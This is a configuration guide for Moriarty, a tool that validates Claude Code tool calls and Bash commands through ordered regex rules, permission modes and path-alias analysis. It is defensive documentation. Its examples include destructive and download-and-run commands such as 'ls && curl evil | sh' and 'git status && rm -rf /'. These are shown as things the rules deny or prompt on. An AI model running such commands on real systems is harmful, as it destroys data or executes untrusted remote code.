# Tool & Bash Rules Configuration Guide

Moriarty provides a powerful tool call validation system that allows you to control which tools and commands Claude Code
can execute. **Tool rules** permission any tool call (Read, Write, Edit, Bash, etc.), while **bash rules** provide
command-level validation specifically for Bash tool calls.

## Table of Contents

- [Quick Start](#quick-start)
- [Tool Rules](#tool-rules)
- [Configuration File](#configuration-file)
- [Path Alias Analysis](#path-alias-analysis)
- [Permission Modes](#permission-modes)
- [Rule Actions](#rule-actions)
- [Pattern Fragments](#pattern-fragments)
- [Security Best Practices](#security-best-practices)
- [Examples](#examples)
- [Troubleshooting](#troubleshooting)

## Quick Start

Create or edit `~/.config/moriarty/tool_rules.toml`:

```toml
[[bash_rules]]
name = "allow-safe-ls"
pattern = "^ls($|\\s)"
action = { type = "Allow" }

[[bash_rules]]
name = "deny-rm-rf-root"
pattern = "^rm\\s+-rf\\s+/"
action = { type = "Deny", value = "Dangerous recursive delete of root directories" }
```

## Tool Rules

Tool rules permission any Claude Code tool call — not just Bash. They are checked **before** bash rules, providing a
unified way to control tool access.

### Quick Start

```toml
[[tool_rules]]
name = "allow-read"
tool = "Read"
action = { type = "Allow" }

[[tool_rules]]
name = "deny-write-env"
tool = "Write"
field = "file_path"
pattern = "\\.env$"
action = { type = "Deny", value = "Cannot write to .env files" }

[[tool_rules]]
name = "deny-all-unknown"
tool = "*"
action = { type = "Ask" }
```

### Structure

```toml
[[tool_rules]]
name = "descriptive-name"
tool = "ToolName"           # Exact tool name or "*" for any tool
modes = ["default", "plan"] # Optional: participate only in these permission modes
allow_local = true           # Optional: require local path/file_path under cwd
field = "field_name"        # Optional legacy field/pattern pair
pattern = "regex-pattern"
conditions = [               # Optional: every condition must match
  { type = "Present", field = "request" },
  { type = "Absent", field = "dangerous" },
  { type = "Equals", field = "enabled", value = true },
  { type = "Matches", field = "path", pattern = "^src/" },
]
action = { type = "ActionType", ... }
```

- **name**: A descriptive name for the rule (used in logs)
- **tool**: Exact tool name to match (e.g., `"Read"`, `"Write"`, `"Edit"`, `"Bash"`, `"Glob"`, `"Grep"`), or `"*"` to
  match any tool
- **modes**: Optional permission-mode allow-list; see [Permission Modes](#permission-modes).
- **allow_local**: Optional boolean. For a condition-free legacy rule, behavior is unchanged: a legacy `field` of `path`
  or `file_path` must be local, no legacy field accepts either local path field, and a non-path legacy field cannot
  satisfy locality. For a rule with `conditions`, every distinct `path` or `file_path` referenced by `Present`,
  `Equals`, or `Matches`, or by the legacy `field` when it names one of those path keys, must resolve locally; `Absent`
  does not select a path. If no path is selected, the legacy fallback still applies. Relative inputs are resolved
  against `cwd`; existing paths are fully canonicalized; non-existent paths are checked by canonicalizing the deepest
  existing ancestor and safely rebuilding the missing suffix so `..` cannot escape above that ancestor. Symlinks that
  resolve outside `cwd` and broken symlinks are rejected. Hard links are treated as ordinary local filesystem entries.
- **field** + **pattern**: Optional legacy pair. When both are present, the regex matches the named top-level field. If
  only one is present, the entire rule is skipped and reported as a configuration error.
- **conditions**: Optional list of typed top-level input predicates. Conditions are ANDed with each other and with the
  tool name, `allow_local`, and legacy `field`/`pattern`. Use separate ordered rules for alternatives and fallback.
- **action**: `Allow`, `Deny`, or `Ask` (see [Rule Actions](#rule-actions)). Note: `Modify` and `ArgumentFilter` are
  Bash-specific and not available for tool rules.

### Conditions

Conditions address literal top-level keys; dots in `field` names are not JSON-path syntax. A rule with any condition
only matches when `tool_input` is an object.

- `{ type = "Present", field = "name" }`: the key exists, including when its value is `null`.
- `{ type = "Absent", field = "name" }`: the key does not exist. This is the exact inverse of `Present` for object
  inputs.
- `{ type = "Equals", field = "name", value = ... }`: the key exists and its raw JSON value equals the configured
  JSON-compatible TOML value. Equality is recursive and type-sensitive, so boolean `true` differs from string `"true"`;
  arrays and inline tables can be compared exactly.
- `{ type = "Matches", field = "name", pattern = "..." }`: scalar regex matching with the same extraction, cwd-prefix
  stripping, and pattern-fragment expansion as legacy `field`/`pattern`.

Missing or extra condition properties are configuration errors. If any `Matches` pattern cannot expand or compile,
Moriarty drops and reports the **whole rule**, never just the bad condition, because partial compilation could broaden
an Allow rule. Run `moriarty rules lint` to detect dropped rules.

### Regex Field Matching

When `field` and `pattern` are specified, Moriarty extracts the field value from the tool input:

- **Strings**: matched directly (e.g., `file_path`, `content`)
- **Numbers**: converted to string (e.g., `42` → `"42"`)
- **Booleans**: converted to string (`true`/`false`)
- **Arrays/Objects/Null**: cannot be matched (rule doesn't match)

**CWD prefix stripping**: Claude Code sends absolute paths in tool inputs (e.g., `/home/user/project/src/main.rs`).
Before regex matching, Moriarty strips the hook input's `cwd` prefix from field values, so rules can use relative paths.
For example, with `cwd = "/home/user/project"`, a field value of `/home/user/project/src/main.rs` becomes `src/main.rs`
for matching purposes. If the value doesn't start with `cwd`, it's matched as-is. Under `allow_local`, path regexes use
the canonicalized local path before stripping; non-path regexes still read the raw input. `Equals` always compares the
raw JSON value, including for paths, with locality enforced as a separate gate.

### Evaluation Order

```
PreToolUse event (any tool)
  |
  +-> tool_rules engine (first-match-wins among eligible rules)
  |     rule's permission mode is eligible?
  |       -> tool matches?
  |         -> allow_local check (if enabled)
  |         -> every condition matches (if configured)
  |         -> legacy field/pattern regex matches (if configured)
  |     Match found? -> return Allow/Deny/Ask
  |     NoMatch? -> continue
  |
  +-> tool_name == "Bash"?
  |     Yes -> bash_rules engine (same permission mode)
  |     No  -> defer to Claude Code (no decision)
```

Both `tool_rules` and `bash_rules` coexist in the same `tool_rules.toml` config file.

### Examples

Allow reading files, deny writing `.env` files, ask for everything else:

```toml
[[tool_rules]]
name = "allow-read"
tool = "Read"
action = { type = "Allow" }

[[tool_rules]]
name = "allow-glob"
tool = "Glob"
action = { type = "Allow" }

[[tool_rules]]
name = "allow-grep"
tool = "Grep"
action = { type = "Allow" }

[[tool_rules]]
name = "deny-write-env"
tool = "Write"
field = "file_path"
pattern = "\\.env$"
action = { type = "Deny", value = "Cannot write to .env files" }

# Bash tools fall through to bash_rules below
# Everything else requires user approval
[[tool_rules]]
name = "ask-unknown"
tool = "*"
action = { type = "Ask" }

# Bash-specific rules (only used when no tool_rule matches Bash)
[[bash_rules]]
name = "allow-ls"
pattern = "^ls($|\\s)"
action = { type = "Allow" }
```

Use [pattern fragments](#pattern-fragments) in tool rule patterns:

```toml
[pattern_fragments]
project = "/home/user/project"

[[tool_rules]]
name = "allow-project-read"
tool = "Read"
field = "file_path"
pattern = "^{{project}}/"
action = { type = "Allow" }
```

Restrict writes to local files under the current working directory:

```toml
[[tool_rules]]
name = "allow-local-src-writes"
tool = "Write"
allow_local = true
field = "file_path"
pattern = "^src/.*\\.rs$"
action = { type = "Allow" }
```

This rule checks both:

- the `file_path` resolves within the canonicalized hook `cwd`
- after cwd-prefix stripping, the relative path matches `^src/.*\\.rs$`

Require ordinary `subagent` execution starts to use top-level `async = true` and omit top-level `turnBudget`, while
leaving action/status/management calls outside this policy:

```toml
[[tool_rules]]
name = "allow-valid-subagent-start"
tool = "subagent"
conditions = [
  { type = "Absent", field = "action" },
  { type = "Equals", field = "async", value = true },
  { type = "Absent", field = "turnBudget" },
]
action = { type = "Allow" }

[[tool_rules]]
name = "deny-invalid-subagent-start"
tool = "subagent"
conditions = [{ type = "Absent", field = "action" }]
action = { type = "Deny", value = "Normal subagent starts require async=true and must omit turnBudget" }
```

The Allow rule must come first because tool rules are first-match-wins among eligible rules. An input containing
`"action": null` treats the key as present and therefore bypasses both rules, while `"turnBudget": null` is present and
denied. Extra unrelated execution fields do not affect either rule.

## Configuration File

Bash rules are configured in `~/.config/moriarty/tool_rules.toml`. Rules are evaluated in order with
**first-match-wins** semantics among eligible rules—the first eligible rule that matches a command determines the
action.

### Basic Structure

```toml
# Optional trusted shell variables eligible for conservative path-alias analysis.
bash_path_aliases = ["P"]

[[bash_rules]]
name = "descriptive-name"
pattern = "regex-pattern"
modes = ["default", "plan"] # Optional
action = { type = "ActionType", ... }
```

- **name**: A descriptive name for the rule (used in logs)
- **pattern**: A regular expression pattern to match commands
- **modes**: Optional permission-mode allow-list; see [Permission Modes](#permission-modes).
- **action**: What to do when the pattern matches (see [Rule Actions](#rule-actions))

### Rule Evaluation Order

Rules are evaluated top-to-bottom. The first eligible matching rule determines the action:

```toml
# This rule is checked first
[[bash_rules]]
name = "deny-dangerous-docker"
pattern = "^docker\\s+system\\s+prune"
action = { type = "Deny", value = "Docker system prune is dangerous" }

# This rule is reached if the first rule is ineligible or doesn't match
[[bash_rules]]
name = "allow-other-docker"
pattern = "^docker"
action = { type = "Allow" }
```

**Important**: Place more specific rules before general ones!

## Path Alias Analysis

Claude Code sometimes shortens a long workspace path with a leading shell assignment and reuses it in later commands.
Moriarty can statically expand selected variables before matching Bash rules:

```toml
bash_path_aliases = ["P"]
```

```bash
P=/work/project/node_modules/.pnpm/@pulumi+pulumi@3.247.0/node_modules/@pulumi/pulumi; \
  rg -n "isUnknown" $P/output.d.ts | head -5
```

With `cwd = /work/project`, the `rg` leaf above is matched as `rg -n "isUnknown" node_modules/.pnpm/.../output.d.ts`,
exactly like the equivalent command containing the literal absolute path. The binding itself grants no permission: every
expanded leaf still has to match the existing ordered rules, out-of-cwd paths remain absolute, and a path containing
`..` is not presented as a safe relative path.

### Trusted Policy

`bash_path_aliases` is an opt-in top-level allow-list. Names must match `[A-Za-z_][A-Za-z0-9_]*`; duplicates are removed
and names are stored in canonical order. Moriarty rejects these shell-control variables at configuration-load time:
`PATH`, `IFS`, `CDPATH`, `GLOBIGNORE`, `BASH_ENV`, `ENV`, `SHELLOPTS`, `BASHOPTS`, `FPATH`, `PS4`, and `PROMPT_COMMAND`.

**Security warning:** configured names are trusted policy. Do not configure variables that change application or tool
behavior, such as compiler flags, package-manager settings, credentials, or configuration-file selectors. Moriarty only
rejects the fixed shell-control set; it cannot know the semantics of every program's environment variables.

### Supported v1 Form

A binding is recognized only when all of these conditions hold:

- it is a leading, synchronous, assignment-only simple command, terminated by `;` or a newline;
- it contains exactly one scalar, non-append assignment and no command, redirect, pipeline peer, `!`, `time`, `&&`,
  `||`, or background `&` separator;
- its name appears in `bash_path_aliases`;
- its unquoted value is an absolute literal matching `^/[A-Za-z0-9/._@+,:=%-]*$`.

Later words may use one plain `$NAME` or `${NAME}` expansion with literal text around it, either unquoted or inside
ordinary double quotes. Supported forms include `$P/output.d.ts`, `--file=$P/input`, `"$P/runtime/mocks.js"`, and
`"$P"/runtime/mocks.js`. Expansion is parser-identified, not textual: single-quoted `$P` stays literal and `$PP` does
not match `P`. Localized `$"…"`, command, arithmetic, process, indirect, length, default-value, transform, and
multiple-expansion forms are not treated as known aliases. Other quoting or escaping in an alias-expanded word is also
unsupported and caps an otherwise-allowed leaf at Ask. A consumed declaration becomes analysis metadata and is not
matched as an executable leaf. An unused declaration remains a leaf requiring confirmation.

Unsupported configured-alias assignments or references do **not** make Moriarty abandon all leaf analysis. The affected
leaf is matched normally, but an Allow is capped at Ask; a Deny still applies, including a Deny on a dangerous later
leaf. Command substitution, backticks, arithmetic substitution, process substitution, and the other existing shell bail
conditions remain whole-command fail-safe cases.

### Mutation Barriers

Moriarty deliberately avoids modeling Bash mutation targets. An assignment invalidates all aliases only when a binding
is active or the assignment targets a configured alias; unrelated standalone environment assignments remain eligible
for normal rules. A dynamic command name or one of these shell-state commands invalidates **all** active aliases and requires confirmation:
`command`, `builtin`, `exec`, `eval`, `source`, `.`, `trap`, `let`, `unset`, `export`, `readonly`, `declare`, `typeset`,
`local`, `read`, `mapfile`, `readarray`, `getopts`, or `printf`. This conservative rule may prompt for a harmless form,
but it prevents later references from being matched against stale paths without needing per-builtin option semantics.

Redirect targets are classified after known alias expansion, so an exact alias-expanded `/dev/null` keeps the discard
exemption while every other writable target retains the real-file Allow-to-Ask cap. An alias expansion in command
position also requires confirmation; `exec` and wrapper barriers likewise prevent a path alias from auto-authorizing a
derived executable name.

Use `moriarty test bash-rules --cwd <dir> --explain '<command>'` to see consumed bindings, original leaf source,
alias-expanded text, final cwd-normalized match text, confirmation reasons, matching rules, and the merged decision.
Normal `moriarty test bash-rules` execution uses the same compound and alias analysis as `--explain` and the live hook.

## Permission Modes

Both `tool_rules` and `bash_rules` accept an optional `modes` array with these exact values, matching Claude Code's hook
wire format: `default`, `plan`, `acceptEdits`, `auto`, `dontAsk`, and `bypassPermissions`. Claude Code's UI label
**Manual** arrives as `default`; `manual` is not a valid configuration value.

```toml
[[bash_rules]]
name = "allow-plan-inspection"
pattern = "^git (status|diff)\\b"
modes = ["plan"]
action = { type = "Allow" }

[[tool_rules]]
name = "ask-default-writes"
tool = "Write"
modes = ["default"]
action = { type = "Ask" }
```

- Omitted `modes` means the rule is unrestricted and participates in every mode. This is a permanent, fully supported
  configuration, not a deprecated compatibility form; omission also preserves existing effective hashes.
- `modes = []` means the rule never participates and intentionally disables it.
- Duplicates are removed and values are stored in canonical order.
- Current hook events require `permission_mode`. A restricted rule cannot match a mode-less historical log row or
  explicit test evaluation; unrestricted rules still can. Unknown configuration and live-hook values are rejected. An
  unrecognized historical log value is warned about and treated as mode-less, so replay remains fail-closed for
  restricted rules.
- Ineligible rules remain in place but are skipped. Evaluation falls through to the next eligible rule, preserving
  first-match-wins among eligible rules. Tool-to-Bash fallback, every compound leaf, bail handling, and an
  `ArgumentFilter` recheck all use the same mode.
- `allow_local` filesystem preflight only runs when an eligible local rule could apply.

Use `moriarty test bash-rules --mode plan '<command>'` to simulate a mode. Omitting `--mode` intentionally runs a
mode-less test evaluation; `--mode` works with `--explain` and `--json` too.

Current completion logs always record the required mode. `hooks report` deliberately keeps its existing public grouping
and JSON shape, while `rules replay` evaluates each internal row under its recorded mode and includes the mode on
divergences. `rules suggest` tags generated rules with the canonical union of contributing known modes; if any
contributing record is mode-less, the suggestion is unrestricted because its original mode cannot be reconstructed.
Strict lint warns on `modes = []` and warns about shadowing only when two rules' mode eligibility overlaps.

## Rule Actions

### Allow

Explicitly allow the command to execute without user confirmation.

```toml
[[bash_rules]]
name = "allow-git-status"
pattern = "^git\\s+status"
action = { type = "Allow" }
```

### Deny

Block the command from executing and show the user an error message.

```toml
[[bash_rules]]
name = "deny-rm-rf"
pattern = "^rm\\s+-rf\\s+/"
action = { type = "Deny", value = "Recursive delete of root directories is not allowed" }
```

### Modify

Transform the command before execution using regex capture groups (`$0`, `$1`, `$2`, etc.).

```toml
[[bash_rules]]
name = "add-dry-run-to-docker-prune"
pattern = "^(docker\\s+system\\s+prune)"
action = { type = "Modify", value = "$1 --dry-run" }
```

**Security Warning**: Modify actions use unescaped capture group replacement. Avoid patterns like `^docker (.*)` that
capture arbitrary input. Use specific patterns like `^(docker\\s+system\\s+prune)$` instead.

### Ask

Defer to the user for case-by-case authorization. Claude Code will prompt the user to approve or deny the command.

```toml
[[bash_rules]]
name = "ask-for-sudo"
pattern = "^sudo\\b"
action = { type = "Ask" }
```

### ArgumentFilter

Structurally remove, add, or replace command arguments before execution. Unlike `Modify` which uses regex capture
groups, `ArgumentFilter` manipulates arguments as discrete tokens, making it easier to handle flags regardless of their
position in the command.

**Important**: After filtering, the modified command is automatically re-validated against all rules. The filtered
command must match an `Allow` rule (or be manually approved via an `Ask` rule) to execute.

#### Removing Arguments

Remove specific flags from commands:

```toml
[[bash_rules]]
name = "cargo-doc-no-browser"
pattern = "^cargo doc.*--open"
action = { type = "ArgumentFilter", remove = ["--open", "-o"], reason = "Browser flags removed" }

[[bash_rules]]
name = "allow-cargo-doc"
pattern = "^cargo doc"
action = { type = "Allow" }
```

The `remove` field supports:

- **Exact matches**: `--open` removes `--open`
- **Prefix matches**: `--open` removes both `--open` and `--open=browser`
- **Position independence**: Removes the argument regardless of where it appears

#### Adding Arguments

Add security flags or default options:

```toml
[[bash_rules]]
name = "docker-run-add-safety"
pattern = "^docker run(?!.* --read-only)"
action = {
  type = "ArgumentFilter",
  add = ["--read-only", "--security-opt=no-new-privileges"],
  reason = "Added security restrictions"
}

[[bash_rules]]
name = "allow-docker-run"
pattern = "^docker run .* --read-only"
action = { type = "Allow" }
```

Arguments are appended to the end of the command.

#### Replacing Arguments

The `replace` field is a table mapping an exact argument token to its replacement. Use it to swap a specific flag for a
safer one:

```toml
[[bash_rules]]
name = "rm-force-interactive"
pattern = "^rm .*-f"
action = {
  type = "ArgumentFilter",
  replace = { "-f" = "-i" },
  reason = "Replaced force mode with interactive"
}

[[bash_rules]]
name = "allow-rm-interactive"
pattern = "^rm .* -i$"
action = { type = "Allow" }
```

`replace` matches whole argument tokens exactly (not prefixes). When you need to drop several variants of a flag and
substitute one safe form, combine `remove` and `add` instead — `remove` also matches `--flag=value` prefixes, which
`replace` does not:

```toml
[[bash_rules]]
name = "rm-force-interactive-variants"
pattern = "^rm .*-f"
action = {
  type = "ArgumentFilter",
  remove = ["-f", "--force"],
  add = ["-i"],
  reason = "Replaced force mode with interactive"
}
```

#### Operation Order

ArgumentFilter operations are applied in this order:

1. **Remove** specified arguments
2. **Replace** specified arguments (if the `replace` field is used)
3. **Add** new arguments

```toml
[[bash_rules]]
name = "combined-operations"
pattern = "^npm start"
action = {
  type = "ArgumentFilter",
  remove = ["--open"],           # First: remove --open
  add = ["--no-browser"],        # Third: add --no-browser
  reason = "Prevent browser from opening"
}
```

#### Re-validation and Security

The filtered command is always re-validated for security:

```toml
# This filter runs first
[[bash_rules]]
name = "filter-cargo-open"
pattern = "^cargo doc.*--open"
action = { type = "ArgumentFilter", remove = ["--open"] }

# The filtered command must match an Allow rule
[[bash_rules]]
name = "allow-cargo-doc"
pattern = "^cargo doc"
action = { type = "Allow" }
```

**What happens**:

1. `cargo doc --open --no-deps` matches the first rule
2. Command is filtered to `cargo doc --no-deps`
3. Filtered command is re-validated
4. Matches the Allow rule → execution allowed

**Security guarantees**:

- If the filtered command doesn't match any Allow rule, it's rejected or requires user approval
- If the filtered command matches a Deny rule, execution is blocked
- Chained ArgumentFilter rules (filter → filter) are prevented to avoid infinite loops

## Pattern Fragments

Pattern fragments allow you to define reusable regex snippets that can be referenced in rule patterns using
`{{fragment_name}}` syntax. This eliminates duplication and makes rules easier to maintain.

### Basic Usage

```toml
[pattern_fragments]
safe_chars = "[^|&;$`()<>{}]"

[[bash_rules]]
name = "allow-ls"
pattern = "^ls{{safe_chars}}*$"
action = { type = "Allow" }
```

The fragment `{{safe_chars}}` is expanded to `[^|&;$`()<>{}]` before the regex is compiled.

### Nested Fragments

Fragments can reference other fragments:

```toml
[pattern_fragments]
safe_chars = "[^|&;$`()<>{}]"
safe_arg = "( {{safe_chars}}+)"
safe_pipe = "( \\| (head|tail|grep){{safe_arg}}*)"

[[bash_rules]]
name = "cargo-with-pipes"
pattern = "^cargo (build|check){{safe_arg}}*{{safe_pipe}}?$"
action = { type = "Allow" }
```

Expansion happens in multiple passes:

1. `{{safe_arg}}` → `( [^|&;$`()<>{}]+)`
2. `{{safe_pipe}}` → `( \\| (head|tail|grep)( [^|&;$`()<>{}]+)\*)`
3. Final pattern is fully expanded

### Built-in Default Fragments

Moriarty provides default fragments for common security patterns:

| Fragment        | Expansion                                                          | Description                                 |
| --------------- | ------------------------------------------------------------------ | ------------------------------------------- |
| `safe_chars`    | ``[^\|&;$`()<>{}]``                                                | Characters that don't allow shell injection |
| `identifier`    | `[a-zA-Z_][a-zA-Z0-9_-]*`                                          | Valid identifier pattern                    |
| `number`        | `[0-9]+`                                                           | Numeric values                              |
| `safe_arg`      | ``( [^\|&;$`()<>{}]+)``                                            | Safe command argument                       |
| `safe_flag`     | `( -[a-zA-Z_][a-zA-Z0-9_-]*)`                                      | Safe command flag                           |
| `safe_path`     | ``( [^\|&;$`()<>{}]+/[^\|&;$`()<>{}]*)``                           | Safe file path                              |
| `safe_pipe_cmd` | `(head\|tail\|grep\|wc\|sort\|uniq)`                               | Safe pipe target commands                   |
| `safe_pipe`     | ``( \\\| (head\|tail\|grep\|wc\|sort\|uniq)( [^\|&;$`()<>{}]+)*)`` | Safe command piping                         |

You can override these by defining your own fragment with the same name.

### Fragment Naming Rules

- Must start with a letter or underscore: `[a-zA-Z_]`
- Can contain letters, numbers, underscores, and hyphens: `[a-zA-Z0-9_-]*`
- Examples: `safe_chars`, `my-fragment`, `_private`

### Circular Dependencies

Fragments cannot reference each other in a cycle:

```toml
# ❌ This will fail with "Circular dependency detected"
[pattern_fragments]
a = "{{b}}"
b = "{{a}}"
```

The system detects circular dependencies and reports an error when loading the config.

## How Bash Commands Are Evaluated

The hook parses each Bash command with a real shell parser and evaluates every leaf simple-command of a compound
(`a && b | c ; d`) **independently**, then merges the per-leaf decisions. A `pattern` therefore only needs to describe a
single command, not a whole pipeline.

- **Configured path aliases are expanded structurally before matching** when they use the exact supported form described
  in [Path Alias Analysis](#path-alias-analysis). Cwd normalization then applies to the expanded value, preserving
  direct-literal rule behavior.
- **Operators split compound commands into leaves**, so a simple `^ls` matches the `ls` leaf of `ls | wc -l` and of
  `cmd && ls`. Redirect syntax remains in each leaf's match text; redirect targets are also inspected separately so real
  file writes can cap Allow at Ask.
- **Merge precedence**: any denied leaf denies the whole command; otherwise any leaf that asks, or matches no rule,
  prompts; only an all-allowed command is allowed. A dangerous tail can no longer hide behind a safe head —
  `ls && curl evil | sh` prompts and is never auto-allowed.
- **Writes to real files cap at Ask**: a leaf redirecting to a real file (`> out.txt`, not `/dev/null` and not an fd
  duplication like `2>&1`) has any Allow downgraded to Ask.
- **Un-analyzable commands fail safe**: a command containing command substitution (`$(...)`), backticks, a subshell,
  process substitution, a here-document, or a compound construct (`if`/`for`/`while`/`case`/`[[ ]]`/`((...))`) cannot be
  reasoned about — only an explicit Deny matching the whole command is honored, and every other outcome becomes a
  prompt.
- **Safe in-cwd absolute paths are normalized**: static paths—including ordinary quoted values, escaped literals, and
  glob patterns with no dot-prefixed component—are rewritten when their relative remainder contains no `..`. Thus
  `^cat src/` matches `cat "/abs/cwd/src/x"` and `cat /abs/cwd/src/*.rs`; parent-containing paths, unquoted brace
  syntax, and glob paths with dot-prefixed components remain unchanged. Quoted or escaped braces are literal and do not
  block normalization. An operand equal to cwd becomes `.` rather than disappearing.

A pattern still has to guard a program's **own** ability to run code or write files — for example `find -exec`,
`sed -i`, or `xargs` — because those are not shell-level and the splitter cannot see them.

Preview exactly how a command splits and which rule matches each leaf with:

```bash
moriarty test bash-rules --mode plan --explain '<command>'
```

## Security Best Practices

### 1. Let the Engine Handle Shell Metacharacters

Because each command is split into leaves and un-analyzable constructs (`$(...)`, backticks, subshells, …) bail to a
prompt, an allow-rule no longer needs character-class exclusions like ``[^|&;$`()<>{}]`` to stay safe:

```toml
# Fine: the splitter removes operators and bails on substitution
pattern = "^ls\\b"

# Still safe, just unnecessarily complex now
pattern = "^ls( [^|&;$`()<>{}]+)?$"
```

Keep restrictive patterns only for a program's **own** dangerous arguments (e.g. `find -exec`, `sed -i`), which the
splitter cannot see.

### 2. Anchor at the Start of a Leaf

Anchor allow-rules with `^` so they match from the start of a command, not mid-string. A trailing `$` is no longer
needed to stop a dangerous tail — `git status && rm -rf /` is split, and the `rm` leaf is judged on its own:

```toml
# Good: matches the start of the `git status` leaf
pattern = "^git status\\b"

# Avoid: matches "git status" anywhere, including inside `echo "git status"`
pattern = "git status"
```

### 3. Escape Special Regex Characters

Remember to escape regex metacharacters (`\`, `(`, `)`, `[`, `]`, `{`, `}`, `.`, `*`, `+`, `?`, `|`):

```toml
# Good: Escapes the dot
pattern = "^npm\\s+install$"

# Bad: Dot matches any character
pattern = "^npm.install$"
```

### 4. Treat Path Alias Names as Trusted Policy

Only configure variables whose sole intended meaning is a reusable path. Never use `bash_path_aliases` as a generic
assignment allow-list; unsupported forms prompt, and the option does not make an assignment or expanded path safe by
itself.

### 5. Place Specific Rules Before General Ones

```toml
# Good order
[[bash_rules]]
name = "deny-dangerous-rm"
pattern = "^rm\\s+-rf"
action = { type = "Deny", value = "rm -rf is too dangerous" }

[[bash_rules]]
name = "allow-safe-rm"
pattern = "^rm\\s+[^-]"
action = { type = "Allow" }
```

### 6. Use Fragments for Security Patterns

Define security patterns once as fragments and reuse them:

```toml
[pattern_fragments]
no_injection = "[^|&;$`()<>{}]"

[[bash_rules]]
name = "cargo-commands"
pattern = "^cargo (build|check|test)( {{no_injection}}+)*$"
action = { type = "Allow" }
```

## Examples

> These examples use the simple per-leaf style. The fragment-heavy patterns shown elsewhere in this guide still work,
> but with the compound-aware engine they are usually unnecessary — see
> [How Bash Commands Are Evaluated](#how-bash-commands-are-evaluated).

### Example 1: Safe Cargo Commands

```toml
# Filter the browser-opening flag from cargo doc
[[bash_rules]]
name = "cargo-doc-no-browser"
pattern = "^cargo doc\\b.*--open"
action = { type = "ArgumentFilter", remove = ["--open", "-o"], reason = "Browser not useful for Claude" }

# Allow the safe cargo subcommands. The splitter handles pipes, redirects, and chaining, so no
# argument or pipe fragments are needed.
[[bash_rules]]
name = "cargo-safe-commands"
pattern = "^cargo (build|check|test|clippy|fmt|doc)\\b"
action = { type = "Allow" }
```

### Example 2: Git Operations

```toml
[[bash_rules]]
name = "allow-git-read"
pattern = "^git (status|diff|log|show)"
action = { type = "Allow" }

[[bash_rules]]
name = "ask-git-write"
pattern = "^git (commit|push|pull|rebase)"
action = { type = "Ask" }

[[bash_rules]]
name = "deny-git-force"
pattern = "^git\\s+push.*--force"
action = { type = "Deny", value = "Force push is not allowed" }
```

### Example 3: Docker Safety

```toml
[[bash_rules]]
name = "docker-add-dry-run"
pattern = "^(docker\\s+system\\s+prune)"
action = { type = "Modify", value = "$1 --dry-run" }

[[bash_rules]]
name = "allow-docker-read"
pattern = "^docker (ps|images|version)"
action = { type = "Allow" }

[[bash_rules]]
name = "ask-docker-write"
pattern = "^docker (build|run|exec)"
action = { type = "Ask" }
```

### Example 4: Comprehensive Security

```toml
[[bash_rules]]
name = "deny-rm-rf-root"
pattern = "^rm\\s+-rf\\s+/"
action = { type = "Deny", value = "Cannot delete from root" }

[[bash_rules]]
name = "deny-sudo"
pattern = "^sudo\\b"
action = { type = "Deny", value = "sudo not allowed" }

# `find -exec`/`-delete` run or remove files (its own flags, invisible to the splitter), so prompt
# on them before the read-only allow-rule below.
[[bash_rules]]
name = "find-mutating"
pattern = "^find\\b.* -(exec|delete)\\b"
action = { type = "Ask" }

# Read-only commands — simple prefixes; the engine prevents injection and caps real-file writes.
[[bash_rules]]
name = "allow-read-commands"
pattern = "^(ls|cat|head|tail|grep|wc|find)\\b"
action = { type = "Allow" }

[[bash_rules]]
name = "allow-cargo"
pattern = "^cargo (build|check|test|clippy|fmt)\\b"
action = { type = "Allow" }

[[bash_rules]]
name = "allow-git-read"
pattern = "^git (status|diff|log|show)\\b"
action = { type = "Allow" }

# Default: ask for anything not explicitly allowed
```

## Troubleshooting

### Rule Not Matching

**Problem**: Your rule isn't matching commands you expect.

**Solution**: Check both its regex and `modes`. A mode-restricted rule is skipped when the current mode is absent or not
listed; run `moriarty test bash-rules --mode <mode> --explain '<command>'` to reproduce the hook. Check the logs at
`~/.local/state/moriarty/hooks/` to see the recorded mode and which rule (if any) matched.

```bash
tail -f ~/.local/state/moriarty/hooks/hooks.log* | grep "Bash rule matched"
```

### Pattern Expansion Errors

**Problem**: A rule you wrote silently has no effect (undefined fragment, circular fragment, or invalid regex), so the
hook drops it.

**Solution**: Run `moriarty rules lint` (add `--strict` to also flag permanently disabled `modes = []`, likely-shadowed,
and over-broad rules). It reports every rule the hook silently ignores and exits nonzero if any exist:

```bash
moriarty rules lint --strict
```

### Unexpected Modifications

**Problem**: Commands are being modified in unexpected ways.

**Solution**: Check your Modify rules and their capture groups. Use logs to see the transformation:

```bash
tail -f ~/.local/state/moriarty/hooks/hooks.log* | grep "Command modified"
```

### Rules Not Loading

**Problem**: Your rules don't seem to be taking effect.

**Solutions**:

- Verify config file location: `~/.config/moriarty/tool_rules.toml`
- Check TOML syntax: `cat ~/.config/moriarty/tool_rules.toml`
- Look for parse errors in logs: `~/.local/state/moriarty/hooks/`

### Testing Patterns

Test a command against your rules with `moriarty test bash-rules`. Add `--explain` to see how the command splits into
leaves, which rule matches each leaf, and the merged decision:

```bash
moriarty test bash-rules --mode default --explain 'git status && rm -rf /'
```

For regex-syntax questions, online testers like [regex101.com](https://regex101.com/) help — but remember:

- Moriarty uses Rust regex syntax (use the "Rust" flavor)
- Patterns are case-sensitive

## Further Reading

- [Rust Regex Syntax](https://docs.rs/regex/latest/regex/#syntax) - Detailed regex syntax documentation
- [TOML Specification](https://toml.io/) - Configuration file format
- `~/.local/state/moriarty/hooks/` - Moriarty logs showing rule evaluation
